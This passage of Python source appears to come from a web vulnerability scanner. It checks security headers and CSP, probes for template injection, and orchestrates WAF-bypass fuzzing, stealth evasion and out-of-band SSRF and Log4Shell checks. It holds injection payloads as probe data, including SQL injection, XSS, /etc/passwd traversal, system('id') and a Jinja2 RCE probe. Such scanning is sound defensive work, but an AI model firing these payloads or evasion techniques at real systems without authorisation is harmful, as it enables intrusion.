                severity="MEDIUM", confidence=100,
                description=(
                    "X-Frame-Options: ALLOW-FROM is deprecated and not supported by "
                    "Chrome, Firefox, or Edge. These browsers ignore the directive entirely, "
                    "leaving the page unprotected against clickjacking."
                ),
                evidence=f"X-Frame-Options: {xfo}",
                url=url,
                cwe="CWE-1021", cvss=5.4, owasp="A05",
                remediation=(
                    "Replace ALLOW-FROM with CSP frame-ancestors:\n"
                    "Content-Security-Policy: frame-ancestors 'self' https://trusted-site.com"
                ),
                tags=["security-headers", "xfo", "allow-from", "deprecated"],
            ))
        elif xfo_upper not in ("DENY", "SAMEORIGIN"):
            findings.append(Finding(
                plugin="security_headers",
                title=f"X-Frame-Options Invalid Value: '{xfo}'",
                severity="HIGH", confidence=100,
                description=(
                    f"X-Frame-Options value '{xfo}' is not a recognised valid value. "
                    "Browsers treat unknown values as absent -- no clickjacking protection."
                ),
                evidence=f"X-Frame-Options: {xfo}",
                url=url,
                cwe="CWE-1021", cvss=6.5, owasp="A05",
                remediation="X-Frame-Options: DENY  (or SAMEORIGIN to allow same-origin framing)",
                tags=["security-headers", "xfo", "invalid"],
            ))
        elif xfo_upper == "SAMEORIGIN" and csp_has_fa:
            # Check for conflict with CSP frame-ancestors 'none'
            if "'none'" in csp.lower() and "frame-ancestors" in csp.lower():
                findings.append(Finding(
                    plugin="security_headers",
                    title="X-Frame-Options SAMEORIGIN Conflicts with CSP frame-ancestors 'none'",
                    severity="LOW", confidence=90,
                    description=(
                        "XFO: SAMEORIGIN permits same-origin framing, but CSP frame-ancestors "
                        "'none' blocks all framing. Inconsistent policies cause unpredictable "
                        "browser behavior. CSP takes precedence in modern browsers."
                    ),
                    evidence=f"X-Frame-Options: {xfo} | CSP: {csp[:200]}",
                    url=url,
                    cwe="CWE-1021", cvss=0.0, owasp="A05",
                    remediation=(
                        "Align the policies. Prefer CSP frame-ancestors as it supersedes "
                        "XFO in all modern browsers. Remove XFO or make both consistent."
                    ),
                    tags=["security-headers", "xfo", "csp", "conflict"],
                ))
        return findings

    # ── CSP deep analysis ─────────────────────────────────────────────────

    def _csp_deep_check(self, csp: str, url: str) -> list:
        findings = []
        csp_l = csp.lower()

        checks = [
            ("'unsafe-inline'" in csp_l,
             "CSP Contains 'unsafe-inline' -- XSS Mitigations Defeated",
             "HIGH", 8.1,
             "CSP 'unsafe-inline' allows arbitrary inline scripts/styles, "
             "completely defeating XSS protection.",
             "Remove 'unsafe-inline'. Use nonces (<script nonce=\"...\"> + CSP nonce-...) "
             "or sha256-... hashes for inline scripts."),

            ("'unsafe-eval'" in csp_l,
             "CSP Contains 'unsafe-eval' -- Dynamic Code Execution Permitted",
             "HIGH", 7.5,
             "CSP 'unsafe-eval' permits eval(), Function(), setTimeout(string), "
             "enabling attacker-controlled code execution if any data reaches these APIs.",
             "Remove 'unsafe-eval'. Refactor code to avoid eval(). Use JSON.parse() "
             "instead of eval() for data parsing."),

            (bool(re.search(r"(?:default-src|script-src)\s+[^;]*\s\*\s", csp)),
             "CSP script-src / default-src Contains Wildcard (*)",
             "HIGH", 8.8,
             "A wildcard source in script-src or default-src allows loading scripts "
             "from any origin, providing no meaningful XSS protection.",
             "Replace wildcard with explicit origins. Use 'self' and named trusted CDNs."),

            ("data:" in csp_l and "script-src" in csp_l,
             "CSP script-src Allows 'data:' URI -- Inline Script Execution",
             "MEDIUM", 6.1,
             "data: URIs in script-src allow execution of base64-encoded inline scripts, "
             "partially bypassing XSS filtering.",
             "Remove 'data:' from script-src."),

            ("http:" in csp_l and ("script-src" in csp_l or "default-src" in csp_l),
             "CSP script-src Allows HTTP: -- Mixed-Content Script Loading",
             "MEDIUM", 6.5,
             "Allowing 'http:' in script-src permits loading scripts over unencrypted "
             "HTTP, enabling MITM script injection.",
             "Replace 'http:' with 'https:' in script-src sources."),

            ("default-src" not in csp_l and "script-src" not in csp_l,
             "CSP Missing default-src and script-src Directives",
             "HIGH", 7.5,
             "Without a default-src or script-src directive the CSP provides no "
             "script injection protection.",
             "Add at minimum: default-src 'self'; script-src 'self'"),
        ]

        for condition, title, sev, cvss, desc, rem in checks:
            if condition:
                findings.append(Finding(
                    plugin="security_headers",
                    title=title,
                    severity=sev, confidence=97,
                    description=desc,
                    evidence=f"Content-Security-Policy: {csp[:300]}",
                    url=url,
                    cwe="CWE-116", cvss=cvss, owasp="A05",
                    remediation=rem,
                    tags=["security-headers", "csp", "weak-csp"],
                ))
        return findings

    # ── Cross-path header consistency ─────────────────────────────────────

    def _check_header_consistency(
        self, responses: list, probe_urls: list
    ) -> list:
        """Return list of (paths, header_name, evidence) for inconsistent headers."""
        issues = []
        key_headers = [
            "x-frame-options",
            "strict-transport-security",
            "content-security-policy",
            "x-content-type-options",
        ]
        # Build map: header → {path: value}
        presence: dict = {h: {} for h in key_headers}
        for url_p, r in zip(probe_urls, responses):
            if not isinstance(r, dict):
                continue
            status = r.get("status", 0)
            if status in (0, 404, 405):
                continue
            path = urlparse(url_p).path
            hdrs = {k.lower(): v for k, v in r.get("headers", {}).items()}
            for h in key_headers:
                presence[h][path] = hdrs.get(h, "")

        for h, path_vals in presence.items():
            if len(path_vals) < 2:
                continue
            vals = list(path_vals.values())
            # If some paths have the header and others don't
            present  = [p for p, v in path_vals.items() if v]
            missing  = [p for p, v in path_vals.items() if not v]
            if present and missing:
                ev = (
                    f"Present on: {present[:3]} | "
                    f"Absent on: {missing[:3]}"
                )
                issues.append((f"{present}↔{missing}", h.title(), ev))
        return issues

    # ── Missing header impact descriptions ────────────────────────────────

    @staticmethod
    def _missing_impact(header: str) -> str:
        impacts = {
            "Strict-Transport-Security": (
                "Enables SSL-stripping MITM attacks. Users who browse over HTTP "
                "will not be automatically upgraded to HTTPS."
            ),
            "Content-Security-Policy": (
                "Without CSP, browsers execute any script on the page. "
                "Successful XSS can steal credentials, tokens, and sensitive data."
            ),
            "X-Frame-Options": (
                "Page can be embedded in a hidden iframe on a malicious site, "
                "tricking authenticated users into performing unintended actions."
            ),
            "X-Content-Type-Options": (
                "Browser may MIME-sniff responses as executable, enabling "
                "content-type confusion attacks."
            ),
            "Referrer-Policy": (
                "Full URL (including sensitive query parameters) may be sent "
                "to third-party sites via the Referer header."
            ),
            "Permissions-Policy": (
                "Browser features (camera, microphone, geolocation) are not "
                "explicitly restricted and may be accessible to embedded content."
            ),
            "Cross-Origin-Opener-Policy": (
                "Window.opener reference is accessible from cross-origin popups, "
                "enabling XS-Leaks and Spectre side-channel attacks."
            ),
            "Cross-Origin-Resource-Policy": (
                "Cross-origin sites can load this resource, potentially leaking "
                "sensitive content or enabling Spectre-based side-channel reads."
            ),
        }
        return impacts.get(header, "")


# ── 10. Server-Side Template Injection Deep Scanner ───────────────────
class SSTIDeepScanner:
    """SSTI with engine-specific confirmation payloads and mathematical proof."""

    # (payload, expected_result, engine)
    PROBES = [
        ("{{7*7}}", "49", "Jinja2/Twig"),
        ("${7*7}", "49", "Freemarker/Spring"),
        ("#{7*7}", "49", "Thymeleaf/Ruby ERB"),
        ("<%= 7*7 %>", "49", "ERB/EJS"),
        ("{{7*'7'}}", "7777777", "Jinja2"),
        ("*{7*7}", "49", "Spring SpEL"),
        ("{7*7}", "49", "Smarty"),
        ("{{''.__class__.__mro__[1]}}", "object", "Jinja2-RCE-probe"),
    ]

    async def scan(self, client, target: str) -> list:
        findings = []
        parsed = urlparse(target)
        params = parse_qs(parsed.query)
        if not params:
            params = {"template": ["x"], "name": ["x"], "msg": ["x"],
                      "subject": ["x"], "body": ["x"], "content": ["x"]}

        for param in list(params.keys())[:6]:
            for payload, expected, engine in self.PROBES:
                inject_url = target.replace(
                    parsed.query,
                    urlencode({**params, param: [payload]}, doseq=True)
                )
                try:
                    r = await client.get(inject_url)
                    body = (r.get("body") or r.get("text") or "") if isinstance(r, dict) else str(r)
                    if expected in body:
                        # Confirm: send a second distinct payload
                        p2, exp2, _ = self.PROBES[1] if self.PROBES.index((payload, expected, engine)) != 1 else self.PROBES[2]
                        _qs2 = urlencode({**params, param: [p2]}, doseq=True)
                        url2 = target.replace(parsed.query, _qs2) if parsed.query else urlunparse(parsed._replace(query=_qs2))
                        r2 = await client.get(url2)
                        body2 = (r2.get("body") or "") if isinstance(r2, dict) else str(r2)
                        confirmed = exp2 in body2
                        findings.append(Finding(
                            plugin="ssti_scan",
                            description=f"SSTI in parameter '{param}' via {engine} engine. Payload '{payload}' produced expected output.",
                            title=f"SSTI ({engine}) -- param '{param}'",
                            severity="CRITICAL",
                            confidence=95 if confirmed else 82,
                            evidence=f"Payload '{payload}' produced '{expected}' in response (dual-confirm: {confirmed})",
                            url=inject_url, param=param,
                            cwe="CWE-94", cvss=9.8, owasp="A03",
                            remediation="Never pass user input to template engines. Use sandboxed rendering.",
                        ))
                        break
                except asyncio.CancelledError:
                    raise
                except Exception as _ssti_exc:
                    _ssti_cat = ErrorClassifier.classify(_ssti_exc)
                    import logging as _ssti_log
                    _ssti_log.getLogger("webscout").debug(
                        "[SSTI] %s payload=\'%s\' param=\'%s\': %s",
                        _ssti_cat, payload[:30], param, _ssti_exc,
                    )
                    if _ssti_cat == "FATAL":
                        raise
                    continue
        return findings


# ── 11. Zero False-Positive Validator ────────────────────────────────
class ZeroFPValidator:
    """Post-scan validator that re-tests each finding to confirm or demote it.
    Applies 3 independent validation strategies per finding."""

    async def validate(self, client, findings: list) -> list:
        validated = []
        for f in findings:
            if f.confidence >= 95 or getattr(f, "confirmed", False):
                validated.append(f)
                continue
            # Re-probe the finding URL
            score = f.confidence
            try:
                r = await client.get(f.url)
                sc = r.get("status", 0) if isinstance(r, dict) else 0
                body = (r.get("body") or "") if isinstance(r, dict) else str(r)
                # Strategy 1: status code still indicates vulnerability
                if sc in (200, 401, 403, 500):
                    score += 3
                # Strategy 2: evidence keyword still present
                if f.evidence and any(kw in body for kw in f.evidence.split()[:4] if len(kw) > 4):
                    score += 4
                # Strategy 3: not a generic error page
                generic = ["404", "not found", "page not found", "error 404"]
                if not any(g in body.lower() for g in generic):
                    score += 3
            except asyncio.CancelledError:
                raise
            except Exception as _zfp_exc:
                _zfp_cat = ErrorClassifier.classify(_zfp_exc)
                import logging as _zfp_log
                _zfp_log.getLogger("webscout").debug(
                    "[ZFP] validate error for '%s': %s (%s)",
                    getattr(f, 'title', '?'), _zfp_exc, _zfp_cat,
                )
                score -= 10  # Penalize if endpoint no longer reachable
            f.confidence = min(score, 100)
            if f.confidence >= 65:
                validated.append(f)
            else:
                log("SKIP", f"ZFP: Demoted low-confidence finding: {f.title} ({f.confidence}%)")
        return validated



def _load_proxy_list(proxy_list_file: Optional[str], no_proxy: bool = False) -> list:
    """
    Load proxy URLs (v22 — no built-in public proxies). Priority:
      1. --no-proxy flag  → return empty list (direct connection only)
      2. External file    → --proxy-list FILE  (one URL per line)
      3. Direct (no proxy) — if neither is supplied the scanner connects directly.
    Proxies without a scheme get http:// prepended automatically.
    Supports up to 500 proxies per file (increased from 300).
    """
    if no_proxy:
        log("INFO", "[ProxyRotator] --no-proxy set -- running DIRECT (no proxy rotation)")
        return []

    if proxy_list_file:
        try:
            path = Path(proxy_list_file)
            if path.exists():
                raw_lines = path.read_text(encoding="utf-8").splitlines()
                proxies = []
                for line in raw_lines:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    if not line.startswith(("http://", "https://", "socks5://", "socks4://")):
                        line = "http://" + line
                    proxies.append(line)
                proxies = proxies[:500]
                if proxies:
                    log("INFO", f"[ProxyRotator] Loaded {len(proxies)} proxies from {proxy_list_file}")
                    return proxies
                else:
                    log("WARN", f"[ProxyRotator] No valid proxies found in {proxy_list_file} -- running direct")
            else:
                log("WARN", f"[ProxyRotator] Proxy file not found: {proxy_list_file} -- running direct")
        except Exception as e:
            log("WARN", f"[ProxyRotator] Failed to load proxy list: {e} -- running direct")

    # No proxy list provided — run without proxy rotation (direct connection)
    return []


async def run_webscout(target: str, args) -> tuple:
    cfg = ScanConfig(
        timeout=args.timeout, concurrency=args.concurrency,
        delay=args.delay, rate_limit=args.rate_limit,
        retries=getattr(args, "retries", 4),
        proxy=args.proxy or "", verbose=args.verbose,
        proxy_list=_load_proxy_list(
            getattr(args, "proxy_list", None),
            no_proxy=getattr(args, "no_proxy", False)
        ),
        proxy_ban_threshold=getattr(args, "proxy_ban_threshold", 1),
        proxy_timeout=getattr(args, "proxy_timeout", 8),
        cookies=args.cookie or "",
        custom_headers={k: v for h in (args.header or [])
                        for k, v in [h.split(":", 1)] if ":" in h},
        jwt_token=args.jwt or "", bearer=args.bearer or "",
        basic_auth=(args.basic_user, args.basic_pass) if hasattr(args, "basic_user") else ("",""),
        login_url=args.login_url or "", username=args.username or "", password=args.password or "",
        ports_list=[int(p) for p in (args.ports_list or "").split(",") if p.strip().isdigit()],
        port_timeout=args.port_timeout,
        race_threads=args.race_threads,
        race_delay_window=args.race_delay,
        workflow_urls=[u.strip() for u in (args.workflow or "").split(",") if u.strip()],
        session_id_param=args.session_param or "",
        api_version_prefixes=args.api_prefixes or ["/api/v", "/v"],
        coupon_codes=[c.strip() for c in (args.coupon_codes or "").split(",") if c.strip()],
        race_method=args.race_method,
        race_data=args.race_data or "",
        custom_templates=(args.custom_templates or "").split(","),
        template_tags=[t.strip() for t in (args.template_tags or "").split(",") if t.strip()],
        nuclei_enabled=args.nuclei,
        nuclei_templates=args.nuclei_templates or "",
        nuclei_threads=args.nuclei_threads,
        nuclei_rate_limit=args.nuclei_rate_limit,
        nuclei_auto_update=not getattr(args, "no_nuclei_update", False),
        active_exploit_confirm=getattr(args, "active_exploit_confirm", False),
        sqlmap_path=getattr(args, "sqlmap_path", "sqlmap") or "sqlmap",
        active_exploit_timeout=getattr(args, "active_exploit_timeout", 1200),
        external_oob=getattr(args, "external_oob", False),
        interactsh_client=getattr(args, "interactsh_client", "interactsh-client") or "interactsh-client",
        auth_macro_file=getattr(args, "auth_macro", "") or "",
        auth_macro_refresh=getattr(args, "auth_macro_refresh", 600),
        hidden_wordlist=args.hidden_wordlist or "",
        burp_har=args.burp_har or "",
        swagger_url=args.swagger_url or "",
        workflow_file=args.workflow_file or "",
        ai_api_key=args.ai_api_key or os.getenv("GEMINI_API_KEY") or os.getenv("GOOGLE_API_KEY") or os.getenv("AI_API_KEY") or "",
        telegram_token=args.telegram_token or "",
        telegram_chat_id=args.telegram_chat_id or "",
        slack_webhook=args.slack_webhook or "",
        email_to=args.email_to or "",
        email_from=args.email_from or "",
        email_password=args.email_password or "",
        smtp_server=args.smtp_server or "",
        jira_url=args.jira_url or "",
        jira_user=args.jira_user or "",
        jira_token=args.jira_token or "",
        github_token=args.github_token or "",
        github_repo=args.github_repo or "",
        passive_har=args.passive_har or "",
        snmp_communities=args.snmp_communities or [],
        smb_creds=args.smb_credentials or "",
        ssh_creds=args.ssh_credentials or "",
        config_file=args.config or "",
        zap_timeout=getattr(args, "zap_timeout", 1200),
        nuclei_subprocess_timeout=getattr(args, "nuclei_timeout", 1200),
        nmap_subprocess_timeout=getattr(args, "nmap_timeout", 1200),
        wpscan_subprocess_timeout=getattr(args, "wpscan_timeout", 1200),
        ffuf_subprocess_timeout=getattr(args, "ffuf_timeout", 1200),
        verify_ssl=not getattr(args, "unsafe_disable_ssl_verification", False),
        allow_private_targets=getattr(args, "allow_private_targets", False),
        safe_mode=not getattr(args, "no_safe_mode", False),
        max_findings=max(1, getattr(args, "max_findings", 1000)),
    )

    # ── Fix 3: --stealth 0 forces aiohttp (disables curl_cffi which may
    #           timeout in container/server/headless environments).
    #           Also disabled when curl_cffi is not installed.
    if not HAS_CURL_CFFI or getattr(args, 'stealth', 2) == 0:
        cfg.use_curl_cffi = False

    if cfg.config_file and Path(cfg.config_file).exists():
        try:
            _cfg_path = cfg.config_file
            _loop_cfg  = asyncio.get_event_loop()
            _raw_cfg   = await _loop_cfg.run_in_executor(
                None, Path(_cfg_path).read_text, "utf-8"
            )
            if _cfg_path.endswith(".json"):
                cfg_data = json.loads(_raw_cfg)
            elif HAS_YAML:
                cfg_data = yaml.safe_load(_raw_cfg) or {}
            else:
                cfg_data = {}
            for k, v in cfg_data.items():
                if hasattr(cfg, k):
                    setattr(cfg, k, v)
        except Exception as e:
            log("WARN", f"Config load error: {e}")

    findings: list = []
    parsed = urlparse(target)
    host = parsed.hostname
    try:
        _validate_target_or_raise(target, cfg)
    except ValueError as _target_error:
        log("WARN", str(_target_error))
        return [], dict(), ScanTimeline(target=target, scan_start=datetime.now())

    # ── Scan Timeline ──────────────────────────────────────────────────
    _timeline = ScanTimeline(target=target, scan_start=datetime.now())

    # Build ScopeEnforcer first so every request is validated
    _scope_hosts = [h.strip() for h in (getattr(args, "scope_hosts", None) or "").split(",") if h.strip()]
    _exclude_paths = [p.strip() for p in (getattr(args, "exclude_paths", None) or "").split(",") if p.strip()]
    scope = ScopeEnforcer(allowed_hosts=_scope_hosts or [host], excluded_paths=_exclude_paths or None)
    if not scope.is_in_scope(target):
        log("WARN", f"Target {target} is out of scope -- aborting.")
        return [], dict(), _timeline

    auth_macro = None
    if getattr(cfg, "auth_macro_file", ""):
        try:
            auth_macro = AuthenticatedMacroRecorder(cfg.auth_macro_file, cfg.auth_macro_refresh)
            await auth_macro.apply_to_config(cfg)
            auth_macro.start_refresh(cfg)
        except Exception as e:
            log("WARN", f"Auth macro initialization failed: {e}")

    client = WebScoutClient(cfg, scope=scope)

    # ── Enforce --no-proxy: clear pool immediately if flag is set ──────────
    if getattr(args, "no_proxy", False) and client._proxy_rotator.has_proxies:
        client._proxy_rotator._proxies.clear()
        client._proxy_rotator._banned.clear()
        client._proxy_rotator._failures.clear()
        log("INFO", "[ProxyRotator] --no-proxy enforced -- proxy pool cleared, using DIRECT connection")

    # ── Pre-validate proxy pool (remove dead proxies before scan starts) ──
    if client._proxy_rotator.has_proxies:
        try:
            _live = await client._proxy_rotator.validate_pool(
                test_url="http://httpbin.org/ip",
                concurrency=40,
                timeout=cfg.proxy_timeout
            )
            if _live == 0:
                log("WARN", "[ProxyRotator] No live proxies found -- clearing pool, using DIRECT connection")
                client._proxy_rotator._proxies.clear()
                client._proxy_rotator._banned.clear()
                client._proxy_rotator._failures.clear()
        except Exception as _pv_err:
            log("WARN", f"[ProxyRotator] Validation skipped: {_pv_err}")
            # Clear pool on error so scan falls through to direct connection
            client._proxy_rotator._proxies.clear()
            client._proxy_rotator._banned.clear()

    all_mods = getattr(args, "all_modules", False)

    # ── Enhancement 1: OOB interactsh registration ───────────────────────
    _oob_mode_arg = getattr(args, "oob_mode", "auto") or "auto"
    _interactsh = InteractshAPIClient(
        custom_server=getattr(args, "interactsh_server", "") or "",
        token=getattr(args, "interactsh_token", "") or "",
    )
    _interactsh_ready = False
    if _oob_mode_arg != "none" and (
       getattr(args, "external_oob", False) or getattr(args, "ssrf", False) or
       getattr(args, "blind_sqli", False) or getattr(args, "log4shell", False) or
       getattr(args, "blind_xss", False) or all_mods):
        try:
            _interactsh_ready = await _interactsh.register()
        except Exception as _ish_e:
            log("WARN", f"[interactsh] Registration skipped: {_ish_e}")

    # ── Enhancement 3: Dynamic confidence engine (global instance) ───────
    _dce = DynamicConfidenceEngine()

    # ── Enhancement 4: Auth session manager ──────────────────────────────
    _auth_mgr = AuthSessionManager(cfg)
    _auth_refresh_task = None
    if cfg.login_url or cfg.jwt_token or cfg.bearer or (cfg.username and cfg.password):
        try:
            _auth_ok = await _auth_mgr.authenticate(client)
            if _auth_ok:
                log("AUTH", "[AuthSession] Authentication successful -- session active")
                # Detect and log SSO providers
                _sso = await _auth_mgr.detect_sso(client, target)
                if _sso:
                    log("AUTH", f"[AuthSession] SSO providers found: {[s['provider'] for s in _sso]}")
                # Enhancement 5: start background auto-refresh loop (30s interval)
                _auth_refresh_task = _auth_mgr.start_auto_refresh(client, interval=30)
            else:
                log("WARN", "[AuthSession] Authentication failed -- scanning as unauthenticated")
        except Exception as _auth_e:
            log("WARN", f"[AuthSession] Auth setup failed: {_auth_e}")

    # ══════════════════════════════════════════════════════════════════════
    #  HELPER COROUTINES
    # ══════════════════════════════════════════════════════════════════════
    async def _safe_run(coro_factory, name: str, timeout_sec: int = 1200):
        """Run a module with a per-module timeout.  Never raises.  Records to timeline.

        ``coro_factory`` must be a *callable* (lambda / function) that returns a
        fresh coroutine each time it is called.  Accepting a factory — rather than
        a pre-created coroutine — is essential: Python coroutines are single-use
        objects.  Trying to re-schedule an already-awaited coroutine raises
        ``RuntimeError: cannot reuse already awaited coroutine``.  By keeping the
        factory we can safely create a brand-new coroutine for the retry path.
        """
        if not callable(coro_factory):
            # Defensive: if a bare coroutine was passed by mistake, wrap it so
            # the rest of the function works; the retry path won't get a fresh
            # coroutine in that case, but at least the first run succeeds.
            _bare_coro = coro_factory
            coro_factory = lambda: _bare_coro  # noqa: E731

        _timeline.begin(name)
        _req_before = client.stats.get("requests", 0)
        task = asyncio.ensure_future(coro_factory())
        try:
            result = await asyncio.wait_for(asyncio.shield(task), timeout=timeout_sec)
            if result is None:
                result = []
            elif not isinstance(result, list):
                try:
                    result = list(result)
                except TypeError:
                    result = []
            _req_after = client.stats.get("requests", 0)
            _timeline.end(name, findings=len(result),
                          requests=_req_after - _req_before)
            return result
        except asyncio.TimeoutError:
            task.cancel()
            try:
                await asyncio.wait_for(task, timeout=5)
            except (asyncio.TimeoutError, asyncio.CancelledError, Exception):
                pass
            log("WARN", f"{name} -- timed out after {timeout_sec}s, skipping")
            _timeline.timeout(name, note=f"timed out after {timeout_sec}s")
            return []
        except asyncio.CancelledError:
            task.cancel()
            try:
                await asyncio.wait_for(task, timeout=5)
            except (asyncio.TimeoutError, asyncio.CancelledError, Exception):
                pass
            _timeline.timeout(name, note="cancelled -- retrying once with fresh coroutine")
            log("WARN", f"{name} -- cancelled (possibly transient). Retrying once...")
            try:
                # coro_factory() produces a *new* coroutine — safe to schedule again
                retry_task = asyncio.ensure_future(coro_factory())
                result = await asyncio.wait_for(retry_task, timeout=timeout_sec)
                if result is None:
                    result = []
                elif not isinstance(result, list):
                    try:
                        result = list(result)
                    except TypeError:
                        result = []
                _req_after = client.stats.get("requests", 0)
                _timeline.end(name, findings=len(result),
                              requests=_req_after - _req_before)
                return result
            except Exception as _retry_err:
                log("WARN", f"{name} -- cancelled retry failed: {_retry_err}")
                _timeline.error(name, note=f"cancelled, retry failed: {str(_retry_err)[:80]}")
                return []
        except (ConnectionResetError, OSError) as _conn_e:
            log("WARN", f"{name} -- connection error: {_conn_e}, retrying once...")
            _timeline.error(name, note=f"connection error: {str(_conn_e)[:80]}")
            await asyncio.sleep(random.uniform(2, 5))
            try:
                retry_task = asyncio.ensure_future(coro_factory())
                result = await asyncio.wait_for(retry_task, timeout=timeout_sec)
                if result is None:
                    result = []
                elif not isinstance(result, list):
                    try:
                        result = list(result)
                    except TypeError:
                        result = []
                return result
            except Exception:
                return []
        except Exception as _e:
            log("WARN", f"{name} -- error: {_e}")
            _timeline.error(name, note=str(_e)[:120])
            return []

    async def _fuzz_all_params():
        fuzzer = WAFBypassFuzzer()
        fuzz_params = parse_qs(parsed.query)
        base_payloads = ['"><script>alert(1)</script>', "' OR '1'='1", "{{7*7}}"]
        res = []
        for param in list(fuzz_params.keys())[:5]:
            res += await fuzzer.fuzz_with_bypass(client, target, param, base_payloads)
        return res

    async def _waf_stealth_scan():
        """WAF Stealth Engine -- التخفي من الجدران النارية."""
        stealth_level = max(0, min(getattr(args, "stealth", 2), 10))
        stealth_engine = WAFStealthEngine(stealth_level=stealth_level)
        log("INFO", f"Stealth mode: Level {stealth_level} -- {WAFStealthEngine.explain_stealth_levels().splitlines()[stealth_level+2].strip() if stealth_level <= 10 else 'Phantom'}")
        waf_fuzzer = WAFBypassFuzzer()
        waf_name, waf_blocked = await waf_fuzzer.detect_waf(client, target)
        if not waf_blocked and "None" in waf_name:
            log("INFO", "[Stealth] No WAF detected -- stealth mode still active for scanning")
        log("INFO", f"[Stealth] Level {stealth_level} | Target WAF: {waf_name}")
        return await stealth_engine.run_stealth_probe(
            client, target,
            payloads=[
                "'OR'1'='1",
                '<scr\x00ipt>alert(1)</scr\x00ipt>',
                "{{7*7}}",
                "../../../etc/passwd",
                "system('id')",
            ],
            waf_name=waf_name,
        )

    async def _csrf_check():
        sess = SessionCSRFManager(client)
        if cfg.login_url and cfg.username:
            await sess.login(cfg.login_url, cfg.username, cfg.password)
        return await sess.test_csrf(target)

    async def _nuclei_tmpl():
        engine = NucleiTemplateEngine(client)
        if cfg.custom_templates and cfg.custom_templates[0]:
            engine.load_custom_templates(cfg.custom_templates)
        return await engine.run(target, tags=cfg.template_tags or None)

    async def _adv_fuzz():
        fzr = AdvancedFuzzer()
        params = await fzr.discover_params(client, target)
        return await fzr.fuzz(client, target, params, categories=["sqli", "xss", "path_traversal"])

    async def _collab_scan():
        res = []
        # ── interactsh REST API OOB (Enhancement 1) ─────────────────────
        if _interactsh_ready:
            try:
                parsed_t = urlparse(target)
                t_params = parse_qs(parsed_t.query)
                # SSRF
                res += await _interactsh.confirm_ssrf(client, target, t_params, wait=25.0)
                # Log4Shell
                res += await _interactsh.confirm_log4shell(client, target, wait=25.0)
                # Blind SQLi (first param only)
                if t_params:
                    first_p = list(t_params.keys())[0]
                    res += await _interactsh.confirm_blind_sqli(client, target, first_p, wait=20.0)
            except Exception as _ish_scan_e:
                log("WARN", f"[interactsh] OOB scan error: {_ish_scan_e}")
        # ── Embedded collaborator (local HTTP callback, LAN/internal only) ──
        sv = EmbeddedCollaboratorServer()
        sv.start()
        try:
            res += await sv.run_oob_ssrf_check(client, target)
            res += await sv.run_oob_xxe_check(client, target)
            res += await sv.run_oob_log4shell_check(client, target)
        except Exception as _ce:
            log("WARN", f"OOB collaborator error: {_ce}")
        finally:
            try: sv.stop()
            except Exception as _sv_exc: logging.getLogger("webscout").debug("[OOB] sv.stop error: %s", _sv_exc)
        return res

    async def _compliance():
        _VALID = {"pci", "hipaa", "gdpr", "owasp", "all"}
        fw = (getattr(args, "compliance_framework", "all") or "all").lower()
        if fw not in _VALID:
            fw = "all"
        return await ComplianceReporter().scan(client, target, list(findings), framework=fw)

    async def _searchsploit():
        ssp = SearchsploitIntegration()
        det = ssp.extract_versions_from_findings(findings)
        if det:
            return ssp.build_findings(target, det)
        return []

    async def _fusion():
        _run = any([getattr(args, k, False) for k in
                    ["fusion_nuclei","fusion_nmap","fusion_wpscan","fusion_ffuf","fusion_zap","fusion_all"]])
        try:
            if _run:
                fusion = MultiScannerFusion(cfg)
                result = await fusion.run(
                    target, list(findings),
                    run_nuclei  = getattr(args, "fusion_nuclei", False) or getattr(args, "fusion_all", False),
                    run_nmap    = getattr(args, "fusion_nmap",   False) or getattr(args, "fusion_all", False),
                    run_wpscan  = getattr(args, "fusion_wpscan", False) or getattr(args, "fusion_all", False),
                    run_ffuf    = getattr(args, "fusion_ffuf",   False) or getattr(args, "fusion_all", False),
                    run_zap     = getattr(args, "fusion_zap",    False) or getattr(args, "fusion_all", False),
                    custom_wordlist  = cfg.hidden_wordlist,
                    nuclei_templates = cfg.nuclei_templates,
                )
                return result if isinstance(result, list) else list(findings)
            elif all_mods:
                return MultiScannerFusion.unify_findings(list(findings))
        except Exception as _fe:
            log("WARN", f"Fusion error: {_fe}")
        return list(findings)

